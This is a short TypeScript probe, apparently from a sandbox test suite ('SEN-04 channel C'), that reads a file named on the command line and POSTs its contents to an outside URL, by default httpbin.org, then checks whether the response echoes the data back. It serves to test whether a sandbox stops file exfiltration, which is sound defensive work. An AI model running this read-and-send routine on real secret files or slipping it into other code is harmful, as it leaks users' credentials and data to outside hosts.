// @ts-nocheck —— 由 _sandbox-tests 的 .mjs 收编（历史一次性探针，机械转 TS）。
// SEN-04 channel C: read the fake-sensitivity file and POST it with node fetch.
// argv[2] = file path, argv[3] = target URL
import { readFileSync } from 'node:fs'
const f = process.argv[2]
const url = process.argv[3] || 'https://httpbin.org/post'
let body = ''
try { body = readFileSync(f, 'utf8') } catch (e) { console.log('NODE_READ_ERR:' + e.code); process.exit(2) }
console.log('NODE_READ_OK bytes=' + body.length)
try {
  const r = await fetch(url, { method: 'POST', headers: { 'content-type': 'text/plain' }, body })
  const t = await r.text()
  console.log('NODE_HTTP_STATUS=' + r.status)
  console.log('NODE_RESP_ECHOES_SECRET=' + (t.includes(body.trim()) ? 'true' : 'false'))
  console.log('NODE_RESP_BYTES=' + t.length)
} catch (e) {
  console.log('NODE_FETCH_ERR:' + e.name + ':' + e.message)
}
